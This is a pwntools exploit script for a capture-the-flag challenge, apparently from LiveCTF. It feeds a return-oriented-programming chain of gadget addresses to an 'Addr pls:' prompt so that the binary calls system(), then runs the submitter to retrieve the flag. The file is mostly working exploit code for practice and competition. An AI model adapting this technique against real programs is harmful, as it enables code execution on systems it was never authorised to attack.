from pwn import *

# elf = exe = ELF("./challenge")

# context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        # return process([exe.path] + argv, *a, **kw)
        HOST = os.environ.get('HOST', 'localhost')
        PORT = 31337
        return remote(HOST, int(PORT))

gdbscript = '''
b *0x4019c0
b *0x0000000000401a54
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

sla(b"Addr pls: ", str(10))
sla(b"Addr pls: ", str(0x2))
sla(b"Addr pls: ", str(3))
sla(b"Addr pls: ", str(400000004))

poprsp = "401798"
pop_rdi_rbp = "402218"
system = "401914"
popraxrdx = "487212"
addrax = "469678"

val1 = "378460"
val2 = "128099"
movraxrdi = "426499"

sla(b"Addr pls: ", pop_rdi_rbp)
sla(b"Addr pls: ", val2)
sla(b"Addr pls: ", val2)
sla(b"Addr pls: ", movraxrdi)
sla(b"Addr pls: ", pop_rdi_rbp)
sla(b"Addr pls: ", val1)
sla(b"Addr pls: ", val1)
sla(b"Addr pls: ", addrax)
sla(b"Addr pls: ", system)
sla(b"Addr pls: ", "0")

sl("./submitter")
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
# io.interactive()

